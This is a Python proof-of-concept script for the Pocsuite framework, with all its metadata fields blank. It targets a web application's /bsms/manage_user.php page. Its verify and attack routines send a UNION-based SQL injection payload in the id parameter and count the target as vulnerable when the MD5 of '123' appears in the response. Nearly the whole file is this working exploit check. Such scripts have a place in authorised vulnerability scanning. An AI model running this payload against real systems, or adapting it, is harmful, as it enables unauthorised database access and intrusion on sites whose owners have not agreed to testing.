#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url

class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = ''''''
	desc = ''''''
	solution = ''''''
	severity = '''''' 
	vulType = ''''''
	taskType = ''''''
	references = ['''''']
	appName = ''''''
	appVersion = ''''''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _verify(self):
		self.url,ip,port = parse_ip_port(self.target,80)
		result = {}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
		}
		path = '''/bsms/manage_user.php?id=-1%27%20union%20select%201,md5(123),3,4,5,6,7%20%23'''
		vulurl = make_verify_url(self.url, path, mod = 0)
		resp = req.get(vulurl, headers = headers, verify = False, allow_redirects = False, timeout = 10)
		if "202cb962ac59075b964b07152d234b70" in resp.content and resp.status_code == 200:
			result['VerifyInfo'] = http_packet(resp)
			result['VerifyInfo']['URL'] = vulurl
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)


	def _attack(self):
		return self._verify()


	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output


register(TestPOC)